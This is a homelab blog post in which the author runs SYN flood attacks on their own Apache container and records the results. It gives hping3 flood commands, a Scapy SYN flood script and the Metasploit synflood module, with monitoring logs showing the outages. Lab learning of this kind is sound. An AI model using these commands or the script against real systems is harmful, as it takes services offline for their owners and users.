---
layout: post
title: Week 10 - DDoS In Practice
tags: [year-of-hacking, python]
---
This week, I'm going to take a look at some variants of DDoS attacks, particularly kinds that can be executed using out-of-the-box tools and basic scripting.

To me, the concept **D**enial **o**f **S**ervice implies exploiting some kind of vulnerability to cause a crash or something similar that causes a service to stop functioning. A **D**istributed **D**enial **o**f **S**ervice implies overloading an application by sheer traffic quantity.
# Setup
On a machine in my homelab, I set up an Apache web server on port 8080 using docker with a cap of 512 Megabytes of memory using the command:
```bash
docker run --name apache --memory="512m" -p 8080:80 httpd
```

When curled, the Apache server returns this simple HTML.
```
jakemull@optiplex-9020-1:~/ddos$ curl localhost:8080
<html><body><h1>It works!</h1></body></html>
```

In a different tmux pane, I will run this python script that will alert me when the server is no longer responding:
```python
import requests
import time
from datetime import datetime
  
IP_ADDR = "192.168.5.140"
PORT = "8080"
BASE_URL = f"http://{IP_ADDR}:{PORT}/index.html"
  
TYPICAL_RESPONSE = "<html><body><h1>It works!</h1></body></html>"
  
start_time = datetime.now()
  
while True:
    try:
        response_text = requests.get(BASE_URL, timeout=1).text.strip()
    except requests.exceptions.ConnectionError:
        print(f"{IP_ADDR} is NOT working: {datetime.now() - start_time} - Reason: ConnectionError")
        time.sleep(1)
        continue
    except requests.exceptions.Timeout:
        print(f"{IP_ADDR} is NOT working: {datetime.now() - start_time} - Reason: Timeout")
        time.sleep(1)
        continue
    if response_text != TYPICAL_RESPONSE:
        print(f"{IP_ADDR} is not delivering correct content: {datetime.now() - start_time}")
    print(f"{IP_ADDR} is working: {datetime.now() - start_time}", end="\r")
    time.sleep(1)
```

One of the most simple methods for doing a DDoS attack is called a SYN Flood. In a typical TCP connection, communication is initiated when:
- Host A sends a TCP segment with the SYN flag activated to Host B.
- Host B responds with a TCP segment with both the SYN/ACK flags activated to Host A
- Host A responds with a TCP segment with the ACK flag activated to Host B.

This is called the 3-way handshake. In order to maintain the state of a connection, both hosts need to allocate some memory. During the handshake, while Host B is waiting for the segment with the ACK flag from Host A in step 3, Host B has allocated a set amount of memory that it will hold for a time until it decides to let it go. This can be exploited by an attacker to make a host allocate too much memory, eventually causing a crash. This is done by sending tens of thousands of SYN segments. Say it takes 84 bytes to keep the state of a TCP connection, each connection state is held for 10 seconds and an attacker can send 10,000 SYN segments, then it will force the victim to allocate 8.4 MB of RAM after 10 seconds. If an attacker can send 10 million segments a second, it will force the machine to allocate 8.4 GB, enough to cause significant lag, if not crash a system entirely.

# hping3
`hping3` is a command-line tool that allows a user to send arbitrary packets to a host. It has a lot of really useful tools for legitimate network engineer purposes, like the `-z` flag that allows you to increment/decrement the TTL of the packets. We're gonna use the `--fast`, `--faster`, and `--flood` flags.

Using the `--fast` flag is not enough to cause a DDoS, after running for 5 minutes, there's only one error:

```bash
{23:31}~/ddos ➭ sudo hping3 -S --fast 192.168.5.140 -p 8080
```

```bash
{23:26}~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:17.168187 - Reason: ConnectionError
192.168.5.140 is working: 0:04:41.516566
```

Here's the results with the `--faster` flag:
```bash
{23:31}~/ddos ➭ sudo hping3 -S --faster 192.168.5.140 -p 8080
```

```bash
{23:32}~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:25.130376 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:32.890300 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:38.131361 - Reason: Timeout
192.168.5.140 is NOT working: 0:00:42.402327 - Reason: Timeout
192.168.5.140 is NOT working: 0:00:49.479263 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:56.347507 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:00.612899 - Reason: Timeout
192.168.5.140 is NOT working: 0:01:02.748265 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:07.172784 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:09.200692 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:01:15.700279 - Reason: ConnectionError
```

And here's the results with the `--flood` flag, which nearly crashed my computer and made the Wendigoon video I was watching on the other monitor become nearly incomprehensible.
```bash
{23:34}~/ddos ➭ sudo hping3 -S --flood 192.168.5.140 -p 8080
```

```bash
{23:35}~/ddos ➭ python3 alert.py
192.168.5.140 is NOT working: 0:00:03.136107 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:05.146903 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:07.159407 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:09.229592 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:11.359851 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:13.387867 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:15.396786 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:17.727767 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:19.734578 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:21.898394 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:23.938181 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:26.016161 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:28.019673 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:30.051269 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:32.268846 - Reason: ConnectionError
192.168.5.140 is NOT working: 0:00:36.057949 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:38.252743 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:40.258710 - Reason: ConnectionError        192.168.5.140 is NOT working: 0:00:42.261723 - Reason: ConnectionError    
```

You can notice that as expected, the higher rates of malicious packets crash the target earlier.

Wireshark with the filter `tcp.flags.syn == 1 and tcp.dstport == 8080` shows 234,017 segments in 60 seconds.

# Scapy
Scapy is a very powerful tool that allows a programmer to send arbitrary packets, giving the user control of basically every field. We can use this simple script:
```python
from scapy.all import *

target_addr = '192.168.5.140'
target_port = 8080

p=IP(dst=target_addr)/TCP(flags="S",  sport=RandShort(),  dport=target_port)
while True:
	send(p, verbose=0)
```
To send packets to port 8080 basically as fast as a single thread can create them. I would like to learn more about multithreading/multiprocessing in the future, and coding up an attack like this would be an excellent application of that technique, so I'll put off improving this attack for a future post.

Wireshark shows that this script is able to generate about 750 SYN segments over 60 seconds.

# Metasploit packages
Searching through the current Metasploit packages with the keyword `dos` reveals a subset of packages under the `auxiliary/dos` path, which contains 119 premade packages. The vast majority of them are platform or software specific, including some alarming ones like `auxiliary/dos/apple_ios/webkit_backdrop_filter_blur` with the description `iOS Safari Denial of Service with CSS` from 2018, and one called `auxiliary/dos/http/metasploit_httphandler_dos` that as far as I can tell, DoS's Metasploit itself.

Metasploit comes with a package called `dos/tcp/synflood` that executes a SYN flood attack. I would typically include the output of the `alert.py` script, but as far as I can tell, running it the first time completely bricked the test machine in my home lab. However, using Wireshark reveals that over 60 seconds, it generates something like 82k packets.

# Finishing up
I'm surprised that the Metasploit package wasn't the most effective in terms of packets per second. Perhaps looking into updating the package would be an interesting future blog post. SYN floods are just about the easiest DoS attack to execute, so in practice, any modern firewall would catch them. I would like the chance to test this again once I acquire a nicer firewall for the home lab.

# Music from this week
[Toxicity](https://open.spotify.com/album/6jWde94ln40epKIQCd8XUh?si=3jG7RSh1SIWCTHIRroR1aA) by System of a Down

[Rumours](https://open.spotify.com/album/0BwWUstDMUbgq2NYONRqlu?si=AJvaEJmwRf2xTDKpEUI-AA) by Fleetwood Mac
